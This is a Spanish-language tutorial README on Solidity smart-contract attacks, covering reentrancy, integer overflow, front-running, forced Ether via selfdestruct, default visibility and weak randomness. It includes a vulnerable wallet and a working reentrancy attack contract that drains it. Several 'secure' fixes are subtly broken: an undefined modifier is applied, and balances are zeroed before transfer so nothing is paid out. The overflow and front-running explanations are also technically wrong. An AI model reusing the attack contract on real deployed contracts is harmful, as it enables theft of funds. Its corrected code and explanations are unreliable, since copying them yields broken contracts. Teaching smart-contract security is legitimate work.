# Solidity_Attacks

## :boom: Reentrancy Attack  

Para comprender mejor el ataque de reentrancia, primero debemos entender el funcionamiento de las funciones y las transacciones en Solidity. Cuando se llama a una función en un contrato inteligente, se inicia una nueva transacción en la red de Ethereum. Durante esta transacción, el contrato inteligente realiza ciertas operaciones y puede llamar a otras funciones o enviar Ether a otros contratos o direcciones. Cuando se llama a una función en un contrato inteligente, cualquier código adicional que se ejecute dentro de esa función se ejecuta en el mismo contexto de la transacción original.

Ahora, para entender mejor cómo funciona un ataque de reentrancia, imaginemos que un contrato inteligente tiene una función que permite a los usuarios retirar Ether de su cuenta en el contrato. Esta función, digamos "retirar()", realiza una serie de operaciones, como verificar el saldo de la cuenta del usuario, actualizar el saldo y enviar Ether a la dirección del usuario. Ahora, si un atacante malintencionado crea un contrato que llama a la función "retirar()" del contrato inteligente, pero luego vuelve a llamar a "retirar()" antes de que la transacción original se haya completado, el contrato malintencionado puede seguir retirando Ether del contrato inteligente de manera repetitiva, aprovechando el hecho de que la función "retirar()" aún no ha terminado de ejecutarse.

Para ilustrar esto con un ejemplo de código, aquí hay un contrato inteligente de ejemplo llamado "WalletInsegura.sol", que contiene una función "retirar()" vulnerable al ataque de reentrancia:


**WalletInsegura.sol**

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletInsegura {
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external {
        require(balances[msg.sender] > 0, "Insufficient balance");

        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");

        balances[msg.sender] = 0;
    }
}
```

En este contrato, los usuarios pueden depositar Ether en su cuenta en el contrato llamando a la función "deposit()", que simplemente actualiza el saldo del usuario en el mapa "balances". Sin embargo, la función "retirar()" es vulnerable a un ataque de reentrancia. Si un atacante malintencionado crea un contrato que llama repetidamente a "retirar()", como se muestra a continuación, el contrato puede retirar Ether del contrato inteligente de manera repetitiva hasta que se quede sin fondos.

Ahora, crearemos un contrato malintencionado llamado "Ataque.sol" para explotar la vulnerabilidad en el contrato "WalletInsegura.sol". El código para el contrato malintencionado:


**Ataque.sol**  

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IWallet {
    function depositar() external payable;
    function retirar() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function atacar() external payable {
        require(msg.value == 1 ether, "Insuficiente eth");
        wallet.depositar{value: 1 ether}();
        wallet.retirar();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 1 ether)
            wallet.retirar();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

Este contrato malintencionado tiene una función llamada "ataque()" que corrobora que se haya enviado ether suficiente para realizar el ataque, hará un depósito llamando a la función "depositar()" ya que la función "retirar()" requiere que este tenga balance y luego llama a la función "retirar()" nuevamente antes de que se actualice el balance en el contrato vulnerable. 

Finalmente, el contrato malintencionado también tiene una función de fallback que se activa cuando se envía Ether al contrato sin especificar una función. Esta función comprueba el saldo del contrato "WalletInsegura.sol" y llama a la función "retirar()" si hay suficiente saldo disponible. Esto se repite hasta que el contrato malintencionado agota los fondos del contrato "WalletInsegura.sol".


Para protegerse contra el ataque de reentrancia, los desarrolladores deben asegurarse de que las funciones críticas del contrato inteligente estén diseñadas para evitar llamadas repetitivas o llamadas a otras funciones que puedan ser explotadas por un atacante malintencionado. Una forma común de hacerlo es usar el patrón de bloqueo de estado, que bloquea el estado del contrato inteligente durante la ejecución de una función para evitar que otras funciones se llamen antes de que la transacción original se complete.

Aquí está el código completo del contrato seguro "WalletSegura.sol" que utiliza el patrón de bloqueo de estado:


**WalletSegura.sol**
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletSegura {
    bool internal bloqueado;
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external noReentrada{
        require(balances[msg.sender] > 0, "Insufficient balance");
        balances[msg.sender] = 0;
        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");
    }

    modifier proteger() {
        require(!bloqueado, "Llamada de ataque");
        bloqueado = true;
        _;
        bloqueado = false;
    }
}
```

En este contrato, se ha agregado una variable booleana "bloqueado" para evitar que las funciones se llamen repetitivamente. La función "retirar()" ahora tiene un modificador personalizado "noReentrada()" que bloquea la función "retirar()" si ya está en ejecución. El modificador establece la variable "bloqueado" en verdadero al inicio de la ejecución de la función y la establece en falso al finalizar. Esto garantiza que la función "retirar()" no se llame repetidamente hasta que se complete la transacción original.


Link: https://www.youtube.com/watch?v=rrvU3DSbXKo  
Repo: https://github.com/meta-dapp/reentracy  



## :boom: Integer overflow/underflow attack  

En Solidity, las variables enteras tienen un rango de valores permitidos, que depende del tipo de variable. Por ejemplo, el tipo **uint8** tiene un rango de valores permitidos de 0 a 255, mientras que el tipo **uint256** tiene un rango de valores permitidos de 0 a 2^256-1.

Por ejemplo, para uint8, el número máximo es 255, y si le agrega 1 más, la variable se desbordará y será igual a 0 (si agrega 2, entonces la variable sería 1).

El ataque de desbordamiento de enteros se produce cuando se manipula una variable para que su valor exceda el rango permitido. Esto puede provocar que la variable se desborde y tome un valor incorrecto, lo que puede causar comportamientos inesperados o incluso el bloqueo del contrato.

Considera el siguiente contrato de Solidity que permite a un usuario apostar en un juego de dados:

```
contract JuegoDeDados {
    uint256 public balance;
    
    function apostar(uint8 _numero) public payable {
        require(msg.value > 0);
        require(_numero >= 1 && _numero <= 6);
        uint8 dado = uint8(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 6 + 1;
        if (dado == _numero) {
            balance += msg.value * 5;
            msg.sender.transfer(msg.value * 5);
        } else {
            balance += msg.value;
        }
    }
}
```

En este contrato, el usuario puede apostar en un número del 1 al 6. Si el número apostado coincide con el número que sale en el dado, el usuario gana cinco veces su apuesta. De lo contrario, el usuario pierde su apuesta. El valor de la apuesta se agrega al balance del contrato.

Sin embargo, hay un problema de desbordamiento de enteros en la línea **balance += msg.value * 5**;. Si el balance actual es mayor o igual a 2^256-5 y un usuario apuesta la cantidad máxima permitida de ether (que es 2^256-1 wei), entonces el resultado del producto **msg.value * 5** excederá el rango permitido y provocará un desbordamiento. Esto hará que el balance tome un valor incorrecto y puede provocar que el contrato no funcione correctamente.

Para evitar este problema, se podría utilizar una librería segura de manejo de enteros, como la librería SafeMath de OpenZeppelin, que se encarga de verificar los límites de los enteros antes de realizar operaciones con ellos. También es importante realizar pruebas exhaustivas del código para identificar y corregir posibles vulnerabilidades.  


## :boom: Frontrunner attack  

El ataque frontrunner en Solidity es una técnica que un atacante puede utilizar para manipular el estado de un contrato antes de que se ejecute una transacción realizada por otro usuario. En resumen, el atacante envía una transacción con una oferta de gas superior y una función que aprovecha el estado del contrato antes de que la transacción original se ejecute, lo que le permite obtener una ventaja sobre el usuario original.

**Car.sol**  

```
contract Car {
    uint public price;
    address public owner;

    constructor() public {
        owner = msg.sender;
        price = 0;
    }

    function setPrice(uint _price) public {
        require(msg.sender == owner);
        price = _price;
    }

    function buy() public payable {
        require(msg.value == price);
        owner = msg.sender;
    }
}
```

En el ejemplo del contrato inteligente, el ataque se puede ejecutar de la siguiente manera:

El propietario del auto establece el precio del auto en 10 ETH con la función setPrice(). Sin embargo, su transacción aún no se ha incluido en la red.

El atacante monitorea la red y detecta que hay una transacción pendiente para establecer el precio del auto en 10 ETH.

El atacante envía una transacción con una comisión alta para ejecutar la función setPrice() antes que la transacción del propietario. Debido a la comisión alta, la transacción del atacante se incluirá en la red antes que la del propietario.

Ahora que el precio del auto se ha establecido en 10 ETH, el atacante envía otra transacción con una comisión aún más alta para ejecutar la función buy() y comprar el auto a un precio más bajo de lo que realmente vale.

La transacción del atacante se incluye en la red antes que cualquier otra transacción pendiente para comprar el auto, por lo que el atacante compra el auto por menos de 10 ETH.

En resumen, el ataque se ejecuta aprovechando la ventaja que tiene el atacante de conocer la próxima transacción que se ejecutará en la red y enviando transacciones con comisiones más altas para asegurarse de que su transacción se incluya antes que la original.

## :boom: Forcefully Send Ether with selfdestruct 

Por lo general, cuando se envía ether a un contrato, este debe ejecutar la función fallback o alguna otra función descrita en el contrato. Hay dos excepciones a esto, donde el ether puede existir en un contrato sin haber ejecutado ningún código. Los contratos que dependen de la ejecución de código para cada ether enviado al contrato pueden ser vulnerables a ataques donde el ether se envía forzosamente a un contrato.

### La vulnerabilidad
Una técnica común de programación defensiva que es útil para aplicar transiciones de estado correctas o validar operaciones es la verificación de invariantes. Esta técnica implica definir un conjunto de invariantes (métricas o parámetros que no deben cambiar) y comprobar que estos invariantes permanezcan sin cambios después de una o muchas operaciones. Esto es típicamente un buen diseño, siempre y cuando los invariantes que se están comprobando sean, de hecho, invariantes. Un ejemplo de un invariante es el totalSupply de un token ERC20 de emisión fija. Como ninguna función debería modificar este invariante, se podría agregar una verificación a la función transfer() que asegure que el totalSupply permanezca sin modificaciones para garantizar que la función está funcionando como se espera.

Hay un "invariante" aparente en particular que puede tentar a los desarrolladores a usarlo, pero que de hecho puede ser manipulado por usuarios externos, independientemente de las reglas establecidas en el contrato inteligente. Este es el ether actual almacenado en el contrato. A menudo, cuando los desarrolladores aprenden Solidity por primera vez, tienen la idea errónea de que un contrato solo puede aceptar o obtener ether a través de funciones pagables (payable). Esta idea errónea puede llevar a contratos que tienen suposiciones falsas sobre el saldo de ether dentro de ellos, lo que puede llevar a una variedad de vulnerabilidades. La prueba irrefutable de esta vulnerabilidad es el uso (incorrecto) de this.balance. Como veremos, los usos incorrectos de this.balance pueden llevar a vulnerabilidades graves de este tipo.

Hay dos formas en las que el ether puede ser enviado (forzosamente) a un contrato sin usar una función pagable o ejecutar ningún código en el contrato. Estas se enumeran a continuación.

### Self Destruct / Suicide
Cualquier contrato puede implementar la función **selfdestruct(address)**, que elimina todo el bytecode de la dirección del contrato y envía todo el ether almacenado allí a la dirección especificada como parámetro. Si esta dirección especificada también es un contrato, no se llama a ninguna función (incluida la función fallback). ***Por lo tanto, la función selfdestruct() se puede usar para enviar ether forzosamente a cualquier contrato, independientemente de cualquier código que pueda existir en el contrato. Esto incluye contratos sin funciones pagables (payable)***. Esto significa que cualquier atacante puede crear un contrato con una función selfdestruct(), enviar ether a él, llamar a selfdestruct(address contrato objetivo) y forzar el envío de ether a un contrato objetivo.

### Pre-sent Ether
La segunda forma en que un contrato puede obtener ether sin usar una función de autenticación o llamar a ninguna función pagable es precargar la dirección del contrato con ether. Las direcciones de contrato son deterministas, de hecho, la dirección se calcula a partir del hash de la dirección que crea el contrato y el nonce de transacción que crea el contrato. es decir, de la forma: dirección = sha3(rlp.encode([dirección_de_cuenta, nonce_de_transacción])). Esto significa que cualquier persona puede calcular cuál será la dirección del contrato antes de que se cree y así enviar ether a esa dirección. Cuando se crea el contrato, tendrá un saldo de ether no nulo.

Examinemos algunos peligros que pueden surgir con el conocimiento anterior.

Consideremos el contrato demasiado simple,

```
1 contract EtherGame {
2     
3     uint public payoutMileStone1 = 3 ether;
4     uint public mileStone1Reward = 2 ether;
5     uint public payoutMileStone2 = 5 ether;
6     uint public mileStone2Reward = 3 ether; 
7     uint public finalMileStone = 10 ether; 
8     uint public finalReward = 5 ether; 
9     
10     mapping(address => uint) redeemableEther;
11     // users pay 0.5 ether. At specific milestones, credit their accounts
12     function play() public payable {
13         require(msg.value == 0.5 ether); // each play is 0.5 ether
14         uint currentBalance = this.balance + msg.value;
15         // ensure no players after the game as finished
16         require(currentBalance <= finalMileStone);
17         // if at a milestone credit the players account
18         if (currentBalance == payoutMileStone1) {
19             redeemableEther[msg.sender] += mileStone1Reward;
20         }
21         else if (currentBalance == payoutMileStone2) {
22             redeemableEther[msg.sender] += mileStone2Reward;
23         }
24         else if (currentBalance == finalMileStone ) {
25             redeemableEther[msg.sender] += finalReward;
26         }
27         return;
28     }
29    
30     function claimReward() public {
31         // ensure the game is complete
32         require(this.balance == finalMileStone);
33         // ensure there is a reward to give
34         require(redeemableEther[msg.sender] > 0); 
35         redeemableEther[msg.sender] = 0;
36         msg.sender.transfer(redeemableEther[msg.sender]);
37     }
38  }
```

Este contrato representa un juego simple (que naturalmente invoca condiciones de carrera) en el que los jugadores envían 0.5 ether al contrato con la esperanza de ser el jugador que alcance uno de tres hitos primero. Los hitos están denominados en ether. El primero en alcanzar el hito puede reclamar una parte del ether cuando el juego haya terminado. El juego termina cuando se alcanza el hito final (10 ether) y los usuarios pueden reclamar sus recompensas.

Los problemas con el contrato EtherGame provienen del mal uso de **this.balance** tanto en las líneas [14] (y por asociación [16]) como en la línea [32]. Un atacante malintencionado podría enviar forzosamente una pequeña cantidad de ether, digamos 0.1 ether, a través de la función selfdestruct() (discutida anteriormente) para evitar que futuros jugadores alcancen un hito. Como todos los jugadores legítimos solo pueden enviar incrementos de 0.5 ether, this.balance ya no sería un número medio entero, ya que también tendría la contribución de 0.1 ether. Esto evita que se cumplan todas las condiciones if en las líneas [18], [21] y [24].

Aún peor, un atacante vengativo que perdió un hito, podría enviar forzosamente 10 ether (o una cantidad equivalente de ether que empuje el saldo del contrato por encima del hito final) lo que bloquearía todas las recompensas en el contrato para siempre. Esto se debe a que la función claimReward() siempre revertirá, debido al require en la línea [32] (es decir, this.balance es mayor que finalMileStone).

### Técnicas preventivas
Esta vulnerabilidad surge típicamente del mal uso de **this.balance**. La lógica del contrato, cuando sea posible, debería evitar depender de valores exactos del saldo del contrato porque pueden ser manipulados artificialmente. Si se aplica lógica basada en **this.balance**, asegúrese de tener en cuenta los saldos inesperados.

*Si se requieren valores exactos de ether depositados, se debe utilizar una variable definida por el usuario que se incrementa en funciones pagables, para realizar un seguimiento seguro del ether depositado. Esta variable no se verá influenciada por el ether forzado enviado a través de una llamada selfdestruct().*

Teniendo esto en cuenta, una versión corregida del contrato EtherGame podría verse así:

```
contract EtherGame {
    
    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether; 
    uint public finalMileStone = 10 ether; 
    uint public finalReward = 5 ether; 
    uint public depositedWei;
    
    mapping (address => uint) redeemableEther;
    
    function play() public payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game as finished
        require(currentBalance <= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }
    
    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0); 
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(redeemableEther[msg.sender]);
    }
 }
```

Aquí hemos creado una nueva variable, depositedEther, que realiza un seguimiento del ether depositado conocido, y es esta variable la que utilizamos para realizar nuestras exigencias y pruebas. Ya no tenemos ninguna referencia a **this.balance**.

Link: https://medium.com/hackernoon/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148


### :nerd_face: Función selfDestruct  

La función selfdestruct() es una función incorporada en Solidity que permite destruir un contrato y enviar los fondos restantes a una dirección de destino.  

La sintaxis de la función selfdestruct es la siguiente:  

```
function selfdestruct(address payable recipient) external  
```  

Donde "recipient" es la dirección a la que se envían los fondos restantes después de la destrucción del contrato.

Cuando se llama a la función selfdestruct, el contrato se elimina de la blockchain y todos los fondos que quedan en el contrato se envían a la dirección de destino. La eliminación del contrato significa que ya no se puede acceder a él y que los datos almacenados en el contrato se pierden para siempre. Es importante tener en cuenta que una vez que se llama a la función selfdestruct, no se puede deshacer la eliminación del contrato.

La función selfdestruct se puede utilizar en situaciones en las que se desea eliminar un contrato una vez que ha cumplido su propósito y se han transferido todos los fondos. Por ejemplo, si un contrato se utiliza para recaudar fondos para una organización benéfica, una vez que se hayan transferido todos los fondos a la organización, se puede utilizar la función selfdestruct para eliminar el contrato y transferir los fondos restantes a la dirección de la organización.

Sin embargo, también se puede utilizar la función selfdestruct de manera maliciosa para eliminar contratos y robar fondos. Un atacante podría crear un contrato malicioso que utilice la función selfdestruct para enviar los fondos a una dirección de su propiedad en lugar de la dirección prevista.

Es importante tener en cuenta que la función selfdestruct no es una herramienta de seguridad por sí sola y debe utilizarse con precaución. Es importante que los contratos que utilizan la función selfdestruct sean auditados cuidadosamente para asegurarse de que se utiliza de manera segura y no se expone a vulnerabilidades.


## :boom: Default Visibilities

La visibilidad predeterminada es un ejemplo de cumplimiento inadecuado de los estándares de codificación.

Las funciones en Solidity tienen especificadores de visibilidad que dictan cómo se les permite llamarlas. La visibilidad determina si una función puede ser llamada externamente por usuarios, por otros contratos derivados, solo internamente o solo externamente. La visibilidad predeterminada para las funciones es [public]. Por lo tanto, las funciones que no especifican ninguna visibilidad pueden ser llamadas por usuarios externos.

La visibilidad predeterminada se convierte en un problema cuando los desarrolladores ignoran los especificadores de visibilidad en funciones que deberían ser privadas (o solo invocables dentro del propio contrato). Es una buena práctica especificar la visibilidad de todas las funciones en un contrato, incluso si están diseñadas para ser públicas.

Consideremos el siguiente contrato:

```
contract HashForEther {
    
    function withdrawWinnings() {
        // Winner if the last 8 hex characters of the address are 0. 
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }
     
     function _sendWinnings() {
         msg.sender.transfer(this.balance);
     }
}
```

Este contrato simple está diseñado para actuar como un juego de recompensas de adivinanzas de direcciones. Para ganar el saldo del contrato, un usuario debe generar una dirección de Ethereum cuyos últimos 8 caracteres hexadecimales sean 0. Una vez obtenida, puede llamar a la función  WithdrawWinnings()para obtener su recompensa.

Lamentablemente, no se ha especificado la visibilidad de las funciones. En particular, la función **_sendWinnings()** es publica y, por lo tanto, cualquier dirección puede llamar a esta función para robar la recompensa.

Link: https://hacken.io/discover/most-common-smart-contract-attacks/

## :boom: Entropy Illusion

Todas las transacciones en la cadena de bloques de Ethereum son operaciones de transición de estado deterministas. Lo que significa que cada transacción modifica el estado global del ecosistema Ethereum y lo hace de manera calculable y sin incertidumbre. En última instancia, esto significa que dentro del ecosistema de la cadena de bloques no hay ninguna fuente de entropía o aleatoriedad. No hay ninguna función rand() en Solidity. Lograr una entropía descentralizada (aleatoriedad) es un problema bien establecido.

Algunos programadores están tratando de escribir sus propias funciones "aleatorias", pero como no están muy familiarizados con el ecosistema de ETH, se equivocan; como resultado, aparecen vulnerabilidades.

------------------------------------

**Link complete:** https://github.com/sigp/solidity-security-blog#dc-example  

Link: https://hacken.io/discover/most-common-smart-contract-attacks/  

Link: https://medium.com/hackernoon/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148  

